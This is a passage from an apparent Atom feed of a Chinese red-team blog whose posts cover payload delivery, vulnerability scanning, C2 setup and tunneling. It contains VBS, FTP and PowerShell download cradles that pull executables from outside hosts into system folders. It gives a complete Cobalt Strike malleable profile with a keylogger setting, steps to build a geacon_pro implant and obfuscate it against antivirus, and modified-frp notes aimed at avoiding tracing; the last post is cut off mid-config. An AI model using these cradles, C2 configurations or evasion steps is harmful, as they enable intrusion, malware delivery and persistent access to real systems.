+    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>wget.vbs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x= createobject(&quot;microsoft.xmlhttp&quot;):x.open &quot;get&quot;,lcase(wscript.arguments(0)),0:x.send():set s = createobject(&quot;adodb.stream&quot;):s.mode = 3:s.type = 1:s.open():s.write(x.responsebody):s.savetofile lcase(wscript.arguments(1)),2 </span><br></pre></td></tr></table></figure><p>f2a.vbs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Dim obj1,obj2 </span><br><span class="line">Dim url </span><br><span class="line">start = timer </span><br><span class="line">url = &quot;http://x.x.x.x/SQLAGENTIHC.exe&quot;   </span><br><span class="line">Set obj1 = CreateObject(&quot;msxml2.xmlhttp&quot;) </span><br><span class="line">Set obj2 = CreateObject(&quot;adodb.stream&quot;) </span><br><span class="line">obj1.open &quot;get&quot;,url,False </span><br><span class="line">obj1.send </span><br><span class="line">temp = obj1.responseBody </span><br><span class="line">obj2.Type = 1 </span><br><span class="line">obj2.Mode = 3 </span><br><span class="line">obj2.Open() </span><br><span class="line">obj2.Write(temp) </span><br><span class="line">obj2.SaveToFile &quot;C:\Users\AllUse~1\SQLAGENTIHC.exe&quot;,2 </span><br></pre></td></tr></table></figure><p>ftp.vbs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">open 221.229.215.227</span><br><span class="line">110</span><br><span class="line">110</span><br><span class="line">get NDEServer.exe C:\ProgramData\boot.exe</span><br><span class="line">bye</span><br></pre></td></tr></table></figure><p>download.ps1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$client = New-Object System.Net.WebClient  </span><br><span class="line">$client.DownloadFile(&quot;http://9x.x.x.x/PL-0000-t.exe&quot;,&quot;C:\Windows\TEMP\KLPBO16A.exe&quot;)  </span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;wget.vbs&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
+      
+    
+    
+    
+    
+    <category term="攻防演练" scheme="https://blog.njcit.me/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>frida学习笔记</title>
+    <link href="https://blog.njcit.me/2023/02/12/Android/frida%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>https://blog.njcit.me/2023/02/12/Android/frida%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
+    <published>2023-02-12T13:19:29.000Z</published>
+    <updated>2023-02-12T13:19:29.059Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>xray使用入门</title>
+    <link href="https://blog.njcit.me/2023/02/10/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/xray%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"/>
+    <id>https://blog.njcit.me/2023/02/10/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/xray%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/</id>
+    <published>2023-02-10T02:12:24.000Z</published>
+    <updated>2023-02-22T01:59:55.634Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一款功能强大的安全评估工具，在各种比赛中，先用xray轮一下总有收获不是吗。</p><h1 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h1><p>支持正版，抵制盗版，谨防后门。  </p><ul><li>xray: <a href="https://stack.chaitin.com/tool/detail?id=1">https://stack.chaitin.com/tool/detail?id=1</a>]</li><li>rad: <a href="https://stack.chaitin.com/tool/detail?id=2">https://stack.chaitin.com/tool/detail?id=2</a></li><li>super-xray:<a href="https://github.com/4ra1n/super-xray">https://github.com/4ra1n/super-xray</a></li></ul><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><p>被动扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray_windows_amd64.exe ws --listen 127.0.0.1:7777 --html-output time1.html</span><br></pre></td></tr></table></figure><p>主动扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --browser-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure><p>从文件中读取url并进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray_windows_amd64.exe ws --url-file url.txt --html-output aaaaaaa.html</span><br></pre></td></tr></table></figure><p>或者使用super-xray图形化进行扫描<br>xray 仅扫描log4j漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray_windows_amd64.exe ws --poc poc-go-apache-log4j2-rce --url-file url.txt --html-output aaaaaaa.html</span><br></pre></td></tr></table></figure><p>xray仅扫描shiro</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --url &quot;http://ip:port/login&quot; --plugins shiro --html-output aaaaaaa.html</span><br></pre></td></tr></table></figure><h2 id="配置反链平台"><a href="#配置反链平台" class="headerlink" title="配置反链平台"></a>配置反链平台</h2><p>在server config.yaml 配置如下,建议使用高端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">reverse:</span><br><span class="line">  db_file_path: &quot;xray.db&quot;                      # 反连平台数据库文件位置, 这是一个 KV 数据库</span><br><span class="line">  token: &quot;fake_token&quot;                             # 反连平台认证的 Token, 独立部署时不能为空</span><br><span class="line">  http:</span><br><span class="line">    enabled: true</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    listen_port: &quot;4443&quot;</span><br><span class="line">    ip_header: &quot;&quot;                       # 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取</span><br><span class="line">  dns:</span><br><span class="line">    enabled: false</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    domain: &quot;&quot;                          # DNS 域名配置</span><br><span class="line">    is_domain_name_server: false        # 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了</span><br><span class="line">    resolve:                            # DNS 静态解析规则</span><br><span class="line">    - type: A                           # A, AAAA, TXT 三种</span><br><span class="line">      record: localhost</span><br><span class="line">      value: 127.0.0.1</span><br><span class="line">      ttl: 60</span><br><span class="line">  client:</span><br><span class="line">    remote_server: false                # 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址</span><br><span class="line">    http_base_url: &quot;&quot;                   # 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置</span><br><span class="line">    dns_server_ip: &quot;&quot;                   # 和 http_base_url 类似，实际用来访问 dns 服务器的地址</span><br></pre></td></tr></table></figure><p>client config.yaml配置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reverse:</span><br><span class="line">  token: &quot;fake_token&quot;</span><br><span class="line">  client:</span><br><span class="line">    remote_server: true</span><br><span class="line">    http_base_url: &quot;http://1.1.1.1:4443&quot;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://docs.xray.cool/">https://docs.xray.cool/</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一款功能强大的安全评估工具，在各种比赛中，先用xray轮一下总有收获不是吗。&lt;/p&gt;
+&lt;h1 id=&quot;下载链接&quot;&gt;&lt;a href=&quot;#下载链</summary>
+      
+    
+    
+    
+    
+    <category term="xray" scheme="https://blog.njcit.me/tags/xray/"/>
+    
+    <category term="自动化" scheme="https://blog.njcit.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>geacon_pro快速上手</title>
+    <link href="https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
+    <id>https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/</id>
+    <published>2023-02-06T06:29:33.000Z</published>
+    <updated>2023-02-17T03:48:04.302Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>过不了360<br>本文主要记录一下使用二改的cobaltstrike配合geacon_pro的简单配置过程放链接：</p><ul><li><a href="https://github.com/H4de5-7/geacon_pro">https://github.com/H4de5-7/geacon_pro</a></li><li><a href="https://github.com/TryGOTry/CobaltStrike_Cat_4.5">https://github.com/TryGOTry/CobaltStrike_Cat_4.5</a></li></ul><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="CobaltStrike-Cat-4-5-配置"><a href="#CobaltStrike-Cat-4-5-配置" class="headerlink" title="CobaltStrike_Cat_4.5 配置"></a>CobaltStrike_Cat_4.5 配置</h2><p>首先安装相应版本的jdk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-11-jre-headless</span><br><span class="line">sudo apt install openjdk-11-jdk</span><br></pre></td></tr></table></figure><p>然后配置CatClient.properties，这个没啥好说的，都有相关提示说明，然后直接运行teamserver就行，基本做到了傻瓜化。</p><h2 id="geacon-pro配置"><a href="#geacon-pro配置" class="headerlink" title="geacon_pro配置"></a>geacon_pro配置</h2><h3 id="配置公钥"><a href="#配置公钥" class="headerlink" title="配置公钥"></a>配置公钥</h3><p>用到的工具<a href="https://github.com/jas502n/BeaconTool/releases/tag/1.0">BeaconTool.jar</a>，需要注意运行这个工具需要使用jdk1.8,运行过一次cs的服务端之后，会在同目录生成.cobaltstrike.beacon_keys文件，建议将此文件复制一份到本地，我这里将文件重命名为了1111,运行以下命令就可以获取公钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\BeaconTool.jar -i .\1111 -rsa</span><br></pre></td></tr></table></figure><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206144500059.png" alt="image-20230206144500059"></p><p>替换到geacon_pro项目的config&#x2F;config.go,这里注意一下不能有多余的空格，不然会报错，如下：</p><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206144727301.png" alt="image-20230206144727301"></p><h3 id="修改c2地址"><a href="#修改c2地址" class="headerlink" title="修改c2地址"></a>修改c2地址</h3><p>下面的c2的ip和端口先在cs里面新建一个https的listen，然后填入即可</p><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206150730989.png" alt="image-20230206150730989"></p><h3 id="适配C2profile"><a href="#适配C2profile" class="headerlink" title="适配C2profile"></a>适配C2profile</h3><p>提供的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"># default sleep time is 60s</span><br><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter &quot;7&quot;;</span><br><span class="line"></span><br><span class="line">https-certificate &#123;</span><br><span class="line">    set C &quot;KZ&quot;;</span><br><span class="line">    set CN &quot;foren.zik&quot;;</span><br><span class="line">    set O &quot;NN Fern Sub&quot;;</span><br><span class="line">    set OU &quot;NN Fern&quot;;</span><br><span class="line">    set ST &quot;KZ&quot;;</span><br><span class="line">    set validity &quot;365&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># define indicators for an HTTP GET</span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">set uri &quot;/www/handle/doc&quot;;</span><br><span class="line"></span><br><span class="line">client &#123;</span><br><span class="line">#header &quot;Host&quot; &quot;aliyun.com&quot;;</span><br><span class="line"># base64 encode session metadata and store it in the Cookie header.</span><br><span class="line">metadata &#123;</span><br><span class="line">base64url;</span><br><span class="line">prepend &quot;SESSIONID=&quot;;</span><br><span class="line">header &quot;Cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"># server should send output with no changes</span><br><span class="line">#header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line">header &quot;Server&quot; &quot;nginx/1.10.3 (Ubuntu)&quot;;</span><br><span class="line">    header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;Accept&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;public&quot;;</span><br><span class="line">        header &quot;Expires&quot; &quot;0&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;must-revalidate, post-check=0, pre-check=0&quot;;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">mask;</span><br><span class="line">netbios;</span><br><span class="line">prepend &quot;data=&quot;;</span><br><span class="line">append &quot;%%&quot;;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># define indicators for an HTTP </span><br><span class="line">http-post &#123;</span><br><span class="line"># Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]</span><br><span class="line">set uri &quot;/IMXo&quot;;</span><br><span class="line">client &#123;</span><br><span class="line">#header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line"></span><br><span class="line"># transmit our session identifier as /submit.php?id=[identifier]</span><br><span class="line"></span><br><span class="line">id &#123;</span><br><span class="line">mask;</span><br><span class="line">netbiosu;</span><br><span class="line">prepend &quot;user=&quot;;</span><br><span class="line">append &quot;%%&quot;;</span><br><span class="line">header &quot;User&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># post our output with no real changes</span><br><span class="line">output &#123;</span><br><span class="line">mask;</span><br><span class="line">base64url;</span><br><span class="line">prepend &quot;data=&quot;;</span><br><span class="line">append &quot;%%&quot;;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># The server&#x27;s response to our HTTP POST</span><br><span class="line">server &#123;</span><br><span class="line">header &quot;Server&quot; &quot;nginx/1.10.3 (Ubuntu)&quot;;</span><br><span class="line">    header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;Accept&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;public&quot;;</span><br><span class="line">        header &quot;Expires&quot; &quot;0&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;must-revalidate, post-check=0, pre-check=0&quot;;</span><br><span class="line"></span><br><span class="line"># this will just print an empty string, meh...</span><br><span class="line">output &#123;</span><br><span class="line">mask;</span><br><span class="line">netbios;</span><br><span class="line">prepend &quot;data=&quot;;</span><br><span class="line">append &quot;%%&quot;;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">post-ex &#123;</span><br><span class="line">    set spawnto_x86 &quot;c:\\windows\\syswow64\\rundll32.exe&quot;;</span><br><span class="line">    set spawnto_x64 &quot;c:\\windows\\system32\\rundll32.exe&quot;;</span><br><span class="line">    </span><br><span class="line">    set thread_hint &quot;ntdll.dll!RtlUserThreadStart+0x1000&quot;;</span><br><span class="line">    set pipename &quot;DserNamePipe##, PGMessagePipe##, MsFteWds##&quot;;</span><br><span class="line">    set keylogger &quot;SetWindowsHookEx&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改 CatServer.properties指定为刚刚创建的c2.profile</p><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151245027.png" alt="image-20230206151245027"></p><p>修改客户端的相关选项为false</p><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151330099.png" alt="image-20230206151330099"></p><h3 id="编译运行"><a href="#编译运行" class="headerlink" title="编译运行"></a>编译运行</h3><p>在Linux下面编译运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151620111.png" alt="image-20230206151620111"></p><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230206151640780.png" alt="image-20230206151640780"></p><h3 id="高级配置"><a href="#高级配置" class="headerlink" title="高级配置"></a>高级配置</h3><p>使用<a href="https://github.com/burrowers/garble">https://github.com/burrowers/garble</a>进行混淆，混淆是在Windows下面进行，并且使用的是cmd。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go install mvdan.cc/garble@latest</span><br><span class="line">set GO111MODULE=on</span><br><span class="line">go get mvdan.cc/garble</span><br><span class="line">garble.exe build</span><br></pre></td></tr></table></figure><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230208151330801.png" alt="image-20230208151330801"></p><p>修改aes iv，在config.go修改完记得在CatServer.properties也修改一下</p><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230208172056488.png" alt="image-20230208172056488"></p><p>修改CatServer.properties版本和端口，尽量高端口</p><p><img src="/../../source/images/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/image-20230210112710514.png" alt="image-20230210112710514"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;过不了360&lt;br&gt;本文主要记录一下使用二改的cobaltstrike配合geacon_pro的简单配置过程放链接：&lt;/p&gt;
+&lt;ul&gt;
+&lt;l</summary>
+      
+    
+    
+    
+    
+    <category term="geacon_pro" scheme="https://blog.njcit.me/tags/geacon-pro/"/>
+    
+    <category term="cobaltstrike" scheme="https://blog.njcit.me/tags/cobaltstrike/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试实用小工具</title>
+    <link href="https://blog.njcit.me/2023/02/03/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E7%94%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
+    <id>https://blog.njcit.me/2023/02/03/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E7%94%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/</id>
+    <published>2023-02-03T01:14:09.000Z</published>
+    <updated>2023-02-28T01:13:03.935Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工欲善<em>其事</em>，必先<em>利其</em>器。一个好的工具可以提升工作的效率，把自己从重复的工作中解放出来。</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="外网部分"><a href="#外网部分" class="headerlink" title="外网部分"></a>外网部分</h2><ul><li><p>springboot heapdump 敏感信息提取工具：<a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p></li><li><p>redis利用工具：<a href="https://github.com/yuyan-sec/RedisEXP">https://github.com/yuyan-sec/RedisEXP</a></p></li><li><p>jwt密码爆破：<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p></li><li><p>漏洞验证框架：<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p></li><li><p>httpx: <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest</span><br><span class="line">httpx -l .\url.txt -title -status-code -tech-detect</span><br></pre></td></tr></table></figure><ul><li>ARL自动化资产收集：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></li></ul><h2 id="内网部分"><a href="#内网部分" class="headerlink" title="内网部分"></a>内网部分</h2><ul><li>CobaltStrike C2：<a href="https://github.com/H4de5-7/geacon_pro">https://github.com/H4de5-7/geacon_pro</a></li><li>Viper：<a href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a></li></ul><h2 id="Android部分"><a href="#Android部分" class="headerlink" title="Android部分"></a>Android部分</h2><ul><li>frida:<a href="https://frida.re/">https://frida.re/</a></li><li>jadx:<a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a></li></ul><h2 id="杂项部分"><a href="#杂项部分" class="headerlink" title="杂项部分"></a>杂项部分</h2><ul><li>scoop:<a href="https://scoop.sh/">https://scoop.sh/</a></li><li>oh my zsh:<a href="https://ohmyz.sh/">https://ohmyz.sh/</a></li><li>oh my posh:<a href="https://ohmyposh.dev/">https://ohmyposh.dev/</a></li></ul><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>感谢开源，从开源中来，到开源中去。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;工欲善&lt;em&gt;其事&lt;/em&gt;，必先&lt;em&gt;利其&lt;/em&gt;器。一个好的工具可以提升工作的效率，把自己从重复的工作中解放出来。&lt;/p&gt;
+&lt;h1 </summary>
+      
+    
+    
+    
+    
+    <category term="工具" scheme="https://blog.njcit.me/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>二改frp使用技巧</title>
+    <link href="https://blog.njcit.me/2023/02/02/%E5%86%85%E7%BD%91/%E4%BA%8C%E6%94%B9frp%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
+    <id>https://blog.njcit.me/2023/02/02/%E5%86%85%E7%BD%91/%E4%BA%8C%E6%94%B9frp%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</id>
+    <published>2023-02-02T03:14:11.000Z</published>
+    <updated>2023-02-02T06:05:44.050Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年的华为行动来的格外的早一些，过完年环境忘得差不多了，打内网没有frp怎么行，搞到一半发现有更方便的防止溯源的方法，文末说一下，就这样。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>魔改frp的下载<a href="https://github.com/Goqi/Erfrp">链接</a>,生成自定义加密的服务器IP的方法可以参考issue，这个就不多讲了，重点讲一下安全配置，默认情况下生成的配置文件是不带密码，这里放上两个官方带密码的例子：  </p><p>服务端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 5000</span><br><span class="line"># 开启kcp模式</span><br><span class="line">kcp_bind_port =5000</span><br><span class="line">authentication_method = token</span><br><span class="line">token = you_token</span><br><span class="line"># IP 与 bind_addr 默认相同，可以不设置</span><br><span class="line"># dashboard_addr = 0.0.0.0</span><br><span class="line"># 端口必须设置，只有设置web页面才生效</span><br><span class="line">dashboard_port = 5001</span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user = root</span><br><span class="line">dashboard_pwd = password</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = p0vj/==</span><br><span class="line"># kcp监听的端口</span><br><span class="line">server_port = 